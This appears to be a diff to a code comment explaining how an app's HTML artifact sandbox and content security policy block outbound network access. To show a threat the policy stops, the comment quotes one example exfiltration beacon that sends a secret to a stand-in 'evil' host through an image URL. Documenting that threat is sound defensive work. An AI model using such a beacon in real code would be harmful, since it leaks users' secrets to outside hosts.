@@ -38,10 +38,14 @@ function toSrcDoc(a: Artifact): string {
  *  HTML artifacts are meant to run (charts, animations, click handlers), so they
  *  are served from their own isolated `artifact://` origin (the backend scheme
  *  handler) under a per-artifact CSP that allows inline + well-known-CDN scripts
- *  but blocks outbound network (`connect-src 'none'`). The `sandbox` here keeps
- *  scripting on but withholds `allow-same-origin`, so the frame runs in an opaque
- *  origin walled off from the app — it cannot reach the parent, the filesystem,
- *  or Drydock's own APIs, and (no `allow-top-navigation`) cannot navigate us away.
+ *  but leaves the artifact no way to send what it renders anywhere: `connect-src
+ *  'none'` kills fetch/XHR/WebSocket, and img/media are data:/blob: only, so the
+ *  `new Image().src = 'https://evil/?d=' + secret` beacon is dead too (ARTIFACT_CSP
+ *  in artifacts.rs is the authority — read its header before widening anything).
+ *  The `sandbox` here keeps scripting on but withholds `allow-same-origin`, so the
+ *  frame runs in an opaque origin walled off from the app — it cannot reach the
+ *  parent, the filesystem, or Drydock's own APIs, and (no `allow-top-navigation`)
+ *  cannot navigate us away.
  *
  *  SVG/Markdown never need scripting, so they keep the strict path: DOMPurify
  *  strips scripts/handlers, `sandbox=""` disables scripting, and the inherited
